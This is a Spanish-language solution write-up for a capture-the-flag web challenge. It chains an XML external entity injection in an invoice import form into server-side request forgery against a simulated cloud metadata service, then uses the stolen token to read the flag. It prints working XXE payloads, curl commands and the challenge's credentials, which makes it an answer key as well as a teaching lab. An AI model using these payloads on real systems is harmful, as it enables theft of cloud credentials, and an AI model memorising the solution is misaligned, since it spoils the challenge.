# Solution: web-xxe-ssrf

## Vulnerability Chain

1. **XXE en importacion XML** - El portal usa lxml con `resolve_entities=True` y `no_network=False`,
   permitiendo que entidades externas hagan peticiones de red.
2. **SSRF al metadata service** - El metadata service esta en la red interna. Usando XXE como vector
   de SSRF, se pueden obtener credenciales IAM falsas (simulando AWS IMDSv1).
3. **Vault token** - El metadata service devuelve un token (`ctf-vault-token-xyz789-secret`) en el
   campo `Token` de las credenciales. Ese token autoriza el acceso a `/api/vault`.

## Paso 1: Reconocimiento

Login con `admin / admin123` o `accountant / acc2024` en `http://TARGET:8080/login`.

Ir a `http://TARGET:8080/import` para ver el formulario de importacion XML.

## Paso 2: XXE a SSRF - Obtener token del metadata service

Subir o pegar el siguiente payload XML en el formulario de importacion:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "http://metadata-service/latest/meta-data/iam/security-credentials/ctf-role">
]>
<invoice>
  <id>INV-PWN-001</id>
  <amount>9999.00</amount>
  <vendor>&xxe;</vendor>
  <currency>PEN</currency>
</invoice>
```

La respuesta contendra en el campo **Proveedor** el JSON del metadata service:

```json
{
  "Code": "Success",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "ctf-vault-token-xyz789-secret",
  "Expiration": "2099-01-01T00:00:00Z"
}
```

Extraer el valor del campo `Token`: `ctf-vault-token-xyz789-secret`

## Paso 3: Obtener la flag

```bash
curl -H "X-Cloud-Token: ctf-vault-token-xyz789-secret" http://TARGET:8080/api/vault
```

Respuesta:
```json
{"flag": "HL4{...}", "message": "Acceso autorizado al vault"}
```

## Alternativa con curl (sin navegador)

```bash
# Login y obtener cookie
curl -c cookies.txt -X POST http://TARGET:8080/login \
  -d "username=admin&password=admin123" -L

# XXE payload via curl
curl -b cookies.txt -X POST http://TARGET:8080/import \
  -F 'xmlcontent=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://metadata-service/latest/meta-data/iam/security-credentials/ctf-role">]><invoice><id>1</id><amount>1</amount><vendor>&x;</vendor></invoice>'

# Obtener flag con el token
curl -H "X-Cloud-Token: ctf-vault-token-xyz789-secret" http://TARGET:8080/api/vault
```

## Notas tecnicas

- La clase `XMLParser` de lxml con `resolve_entities=True` + `no_network=False` + `load_dtd=True`
  permite XXE completo incluyendo SSRF a URLs HTTP.
- El metadata service no tiene autenticacion (simula IMDS de AWS v1, que tampoco la tenia).
- El token del vault es estatico y equivale a un token de sesion de corta duracion de AWS STS.
